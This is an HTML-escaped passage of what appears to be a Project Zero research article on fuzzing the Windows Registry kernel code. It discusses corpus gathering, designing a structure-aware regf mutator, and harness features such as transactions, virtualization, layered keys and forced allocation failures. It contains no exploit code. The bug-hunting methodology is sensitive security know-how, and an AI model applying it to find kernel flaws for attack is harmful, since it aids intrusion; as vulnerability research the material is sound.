href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/20_App_hive_security_inconsistencies&quot;&gt;WinRegLowSeverityBugs #20&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 class=&quot;ujDEXfwdRL-c28 ujDEXfwdRL-c11&quot; id=&quot;h.577iyfgpsojo&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Fuzzing considerations&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Due to the Windows Registry&amp;#39;s strictly defined format (regf) and interface (around a dozen specific syscalls that operate on it), automated testing in the form of fuzzing is certainly possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We are dealing with kernel code here, so it&amp;#39;s not as simple as taking any library that parses a file format and connecting it to a standard fuzzer like &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/AFLplusplus/AFLplusplus&quot;&gt;AFL++&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/google/honggfuzz&quot;&gt;Honggfuzz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/Jackalope&quot;&gt;Jackalope&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;ndash; r&lt;/span&gt;&lt;span&gt;egistry fuzzing requires a bit more work.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;But, in its simplest form, it could consist of just a few trivial steps: finding an existing regf file, writing a bit-flipping mutator, writing a short harness that loads the hive using &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regloadappkeyw&quot;&gt;RegLoadAppKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and then running those two programs in an infinite loop and waiting for the system to crash.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;It&amp;#39;s hard to argue that this isn&amp;#39;t &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c13 ujDEXfwdRL-c35&quot;&gt;some&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;form of fuzzing, and in many cases, these kinds of methods are perfectly sufficient for finding plenty of serious vulnerabilities.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;After all, my entire months-long research project started with this fairly primitive fuzzing, which did more or less what I described above, with just a few additional improvements:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_137rha48dom7-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Fixing the hash in the regf header,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Performing a few simple operations on the hive, like enumerating subkeys and values,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Running on multiple machines at once,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Collecting&lt;/span&gt;&lt;span&gt;&amp;nbsp;code coverage information from the Windows kernel.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;Despite my best efforts, this type of fuzzing was only able to find one vulnerability (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451427&quot;&gt;CVE-2022-35768&lt;/a&gt;&lt;/span&gt;&lt;span&gt;), compared to over 50 that I later discovered manually by analyzing the Windows kernel code myself.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This ratio doesn&amp;#39;t speak well for fuzzing, and it stems from the fact that the registry isn&amp;#39;t as simple a target for automated testing as it might seem.&lt;/span&gt;&lt;span&gt;&amp;nbsp;On the contrary,&lt;/span&gt;&lt;span&gt;&amp;nbsp;each individual element of such fuzzing is quite difficult and requires a large time investment if one wishes to do it effectively.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the following sections, I&amp;#39;ll focus on each of these components (corpus, mutator, harness and bug detection), pointing out what I think could be improved in them compared to the most basic version discussed above.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.57628r5azbh3&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Initial corpus&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The first issue a potential researcher may encounter is gathering an initial corpus of input files.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Sure, one can typically find dozens of regf files even on a clean Windows installation&lt;/span&gt;&lt;span&gt;, but t&lt;/span&gt;&lt;span&gt;he problem is that they are all very simple and don&amp;#39;t exhibit characteristics interesting from a fuzzing perspective.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&amp;nbsp;In particular:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_qehakqxejyir-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;All of these hives are generated by the same registry implementation, which means that their state is limited to the set of states produced by Windows, and not the wider set of states accepted by the hive loader.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;The data structures within them are practically never even close to the limits imposed by the format itself, for example:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_qehakqxejyir-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;The maximum length of key and value names are 256 and 16,383 characters, but most names in standard hives are shorter than 30 characters.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;The maximum nesting depth of the tree is 512 levels, but in most hives, the nesting doesn&amp;#39;t exceed 10 levels.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;The maximum number of keys and values in a hive is limited only by the maximum space of 2 GiB, but standard hives usually include at most a few subkeys and associated values &amp;ndash; certainly not the quantities that could trigger any real bugs in the code.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This means that gathering a good initial corpus of hives is very difficult, especially considering that there aren&amp;#39;t many interesting regf hives available on the Internet, either.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The other options are as follows: either simply accept the poor starting corpus and hope that these shortcomings will be made up for by a good mutator (see next section), especially if combined with coverage-based fuzzing, or try to generate a better one yourself by writing a generator based on one of the existing interfaces (the kernel registry implementation, the &lt;/span&gt;&lt;span&gt;user-mode &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library-portal&quot;&gt;Offline Registry&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library-portal&quot;&gt;&amp;nbsp;Library&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or some other open-source library&lt;/span&gt;&lt;span&gt;). As a last resort, you could also write your own regf file generator from scratch, where you would have full control over every aspect of the format and could introduce any variance at any level of abstraction.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The&lt;/span&gt;&lt;span&gt;&amp;nbsp;last approach is certainly the most ambitious and time-consuming&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;, but could potentially yield the best results.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.zhu0dplmikq9&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Mutator&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Overall, the issue with the mutator is very similar to the issue with the initial corpus.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In both cases, the goal is to generate the most &amp;quot;interesting&amp;quot; regf files possible, according to some metric.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, in this case, we can no longer ignore the problem and hope for the best.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If the mutator doesn&amp;#39;t introduce any high-quality changes to the input file, nothing else will.&lt;/span&gt;&lt;span&gt;&amp;nbsp;There is no way around it &amp;ndash; w&lt;/span&gt;&lt;span&gt;e have to figure out how to make our mutator test as much state of the registry implementation as possible.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;For simplicity, let&amp;#39;s assume the simplest possible mutator that randomly selects N bits in the input data and flips them, and/or selects some M bytes and replaces them with other random values.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Let&amp;#39;s consider for a moment what logical types of changes this approach can introduce to the hive structure:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_ygp4aypqry7g-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Enable or disable some flags, e.g., in the _CM_KEY_NODE.Flags field,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Change the value of a field indicating the length of an array or list, e.g., _CM_KEY_NODE.NameLength, _CM_KEY_VALUE.DataLength, or a 32-bit field indicating the size of a given cell,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Slightly change the name of a key or value, or the data in the backing cell of a value,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Corrupt a value sanitized during hive loading, causing the object to be removed from the hive during the self-healing process,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Change the value of some cell index, usually to an incorrect value,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Change/corrupt the binary representation of a security descriptor&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&amp;nbsp;in some way.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;This may seem like a broad range of changes, but in fact&lt;/span&gt;&lt;span&gt;, each of them is very local and uncoordinated with other modifications in the file.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This can be compared to binary mutation of an XML file &amp;ndash; sometimes we may corrupt/remove some critical tag or attribute, or even change some textually encoded number to another valid number &amp;ndash; but in general, we should not expect any interesting structural changes to occur, such as changing the order of objects, adding/removing &lt;/span&gt;&lt;span&gt;objects&lt;/span&gt;&lt;span&gt;, duplicating objects, etc.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Hives are very similar in nature. For example, it is possible to set the &lt;/span&gt;&lt;span&gt;KEY_SYM_LINK flag in a key node by pure chance, but for this key to actually become a valid symlink, it is also necessary to remove all its current values, &amp;#8203;&amp;#8203;and add a new value named &amp;quot;SymbolicLinkValue&amp;quot; of type REG_LINK containing a fully qualified registry path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;W&lt;/span&gt;&lt;span&gt;ith a mutator operating on single bits and bytes, the probability of this happening is effectively zero.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;In my opinion, a dedicated regf mutator would need to operate simultaneously on four levels of abstraction&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;, in order to be able to create the conditions necessary for triggering most bugs:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_rdq5wlyhqi2l-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;On the high-level structure of a hive, where only logical objects matter: keys, values, security descriptors, and the relationships between them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Mutations could involve adding, removing, copying, moving, and changing the internal properties of these three main object types.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These mutations should generally conform to the regf format, but sometimes push the boundaries by testing edge cases like handling long names, a large number of subkeys or values, or a deeply nested tree.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;On the level of specific cell types, which can represent the same information in many different ways.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This primarily refers to all kinds of lists that connect higher-level objects, particularly subkey lists (index leaves, fast leaves, hash leaves, root indexes), value lists, and linked lists of security descriptors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Where permitted by the format (or sometimes even in violation of the format), the internal representation of these lists could be changed, and its elements could be rearranged or duplicated.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;On the level of cell and bin layout: taking the entire set of interconnected cells as input, they could be rearranged in different orders, in bins of different sizes, sometimes interspersed with empty (or artificially allocated) cells or bins.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This could be used to find vulnerabilities specifically related to hive memory management, and also to potentially facilitate triggering/reproducing hive memory corruption issues more reliably.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;On the level of bits and bytes: although this technique is not very effective on its own, it can complement more intelligent mutations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;You never know what additional problems can be revealed through completely random changes that may not have been anticipated when implementing the previous ideas.&lt;/span&gt;&lt;span&gt;&amp;nbsp;The only caveat is to be careful with the number of those bit flips&lt;/span&gt;&lt;span&gt;, as too many of them could negate the overall improvement achieved through higher-level mutations.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As you can see, developing a good mutator requires some consideration of the hive at many levels, and would likely be a long and tedious process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The question also remains whether the time spent in this way would be worth it compared to the effects &lt;/span&gt;&lt;span&gt;that can be &lt;/span&gt;&lt;span&gt;achieved through manual code analysis.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is an open question, but as a fan of the registry, I would be thrilled to see an open-source project equivalent to &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8 ujDEXfwdRL-c35&quot;&gt;&lt;a href=&quot;https://github.com/fonttools/fonttools&quot;&gt;fonttools&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;for regf files&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;i.e., a library that allows &amp;quot;decompiling&amp;quot; hives into XML (&lt;/span&gt;&lt;span&gt;or &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;similar) and enables efficient operation on it.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;One can &lt;/span&gt;&lt;span&gt;only&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19 ujDEXfwdRL-c35&quot;&gt;&amp;nbsp;dream... &amp;#128578;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;Finally, I would like to point out that regf files are not the only type of input for which a dedicated mutator &lt;/span&gt;&lt;span&gt;could &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;be created.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;As I&amp;#39;ve already mentioned before, there are also accompanying .LOG1/.LOG2 and .blf/.regtrans-ms files, responsible for the atomicity of individual registry operations and KTM transactions, respectively.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;Both types of files may not be as complex as the &lt;/span&gt;&lt;span&gt;core &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;hive files&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;but mutating them might still be worthwhile&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;, especially since some bugs have been &lt;/span&gt;&lt;span&gt;historically &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;found in their handling.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;Additionally, &lt;/span&gt;&lt;span&gt;other&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;registry &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;operations performed by the harness could also be treated as part of the input.&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This would resemble an&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;architecture similar to&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/google/syzkaller&quot;&gt;Syzkaller&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;, and storing registry call sequences as part of the corpus would require writing a special grammar-based mutator, or possibly adapting an &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://github.com/google/syzkaller/blob/master/prog/mutation.go&quot;&gt;existing&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c19&quot;&gt;&amp;nbsp;one.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.l95hx217spwi&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Harness&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;While having a good mutator for registry-related files is a great start, the vast majority of potential vulnerabilities do not manifest when loading a malformed hive, but only during further operations on said hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These bugs are mainly related to some complex and unexpected state that has arisen in the registry, and triggering it usually requires a very specific sequence of system calls.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, a well-constructed harness should support a broad range of registry operations in order to effectively test as many different internal states as possible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In particular, it should:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_tm3swphxsxm3-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Perform all standard operations on keys (opening, creating, deleting, renaming, enumerating, setting properties, querying properties, setting notifications), values (setting, deleting, enumerating, querying data) and security descriptors (querying keys for security descriptors, setting new descriptors).&lt;/span&gt;&lt;span&gt;&amp;nbsp;For the best result, it would be preferable to randomize the values of their arguments (to a reasonable extent), &lt;/span&gt;&lt;span&gt;as well as the order &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;in which the operations are performed.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Support a &amp;nbsp;&amp;quot;deferred close&amp;quot; mechanism, i.e. instead of closing key handles immediately, maintain a certain cache of such handles to refer to them at a later point in time.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In particular, the idea is to sometimes perform an operation on a key that has been deleted, renamed or had its hive unloaded, in order to trigger potential bugs related to object lifetime or the verification that a given key actually exists prior to performing any action on it.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Load input hives with &lt;/span&gt;&lt;span&gt;different &lt;/span&gt;&lt;span&gt;flags.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The main point here is to load hives with and without the REG_APP_HIVE flag, as the differences in the treatment of app hives and regular hives are sometimes significant enough to warrant testing both scenarios.&lt;/span&gt;&lt;span&gt;&amp;nbsp;R&lt;/span&gt;&lt;span&gt;andomizing the states of the other few flags that can take arbitrary values &lt;/span&gt;&lt;span&gt;c&lt;/span&gt;&lt;span&gt;ould also yield positive results.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Support the registry virtualization mechanism, which can consist of several components:&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_tm3swphxsxm3-1 start&quot;&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;Periodically enabling and disabling virtualization for the current process using the SetTokenInformation(TokenVirtualizationEnabled) call,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;Setting various virtualization flags for individual keys using the NtSetInformationKey(KeySetVirtualizationInformation) call&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;,&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 92pt;&quot; class=&quot;c10 c36 li-bullet-0&quot;&gt;&lt;span&gt;Creating an additional key structure under the HKU\&amp;lt;SID&amp;gt;_Classes\VirtualStore tree to exercise the mechanism of key replication / merging state in &amp;quot;query&amp;quot; type operations (e.g. in enumeration of the values of a virtualized key).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_tm3swphxsxm3-0&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Use transactions, both KTM and lightweight.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In particular, it would be useful to mix non-transactional calls with transactional ones, as well as transactional calls within different transactions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This way, we would be able to the code paths responsible for making sure that no two transactions collide with each other, and that non-transactional operations always roll back the entire transactional state before making any changes to the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It would also be beneficial if some of these transactions were committed and some rolled back, to test as much of their implementation as possible.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Support layered keys. For many registry operations, the layered key implementation is completely different than the standard one, and almost always more complicated.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, adding differencing hive support to the fuzzer wouldn&amp;#39;t be trivial, as it would require additional communication with VRegDriver to load/unload the hiv&lt;/span&gt;&lt;span&gt;e&lt;/span&gt;&lt;span&gt;. It would also require making some fundamental decisions: which hive(s) do we overlay our input hive on top of?&lt;/span&gt;&lt;span&gt;&amp;nbsp;Should &lt;/span&gt;&lt;span&gt;we keep pairs of hives in the corpus and overlay them one on top of the other, in order to control the properties of all the keys on the layered key stack?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Do we limit ourselves to a key stack of two elements, or create more complicated stacks consisting of three or more hives?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These are all open questions to which I don&amp;#39;t know the answer, but I am sure that implementing some form of layered key support would positively affect the number of vulnerabilities that could be found this way.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Potentially support multi-threading and execute the harness logic in multiple threads at once, allowing it to trigger potential race conditions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The downside of this idea is that unless we run the fuzzing in some special environment, it would probably be non-deterministic, making timing-related bugs difficult to reproduce.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c30&quot;&gt;&lt;span&gt;The final consideration for harness development is the prevalence of registry issues caused by improper error handling, particularly cell allocator out-of-memory errors.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A potential harness &lt;/span&gt;&lt;span&gt;feature &lt;/span&gt;&lt;span&gt;could be to artificially trigger these circumstances, perhaps by aggressively filling almost all of the 2 GiB stable/volatile space, causing HvAllocateCell/HvReallocateCell functions to fail.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, this approach would waste significant disk space and memory, and substantially slow down fuzzing, so the net benefit is unclear.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Alternative options include hooking the allocator functions to make them fail for a specific fraction of requests (e.g., using DTrace), or applying a runtime kernel modification to reduce the maximum hive space size from 2 GiB to some smaller value (e.g., 16 MiB). These ideas are purely theoretical and would require further testing.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; 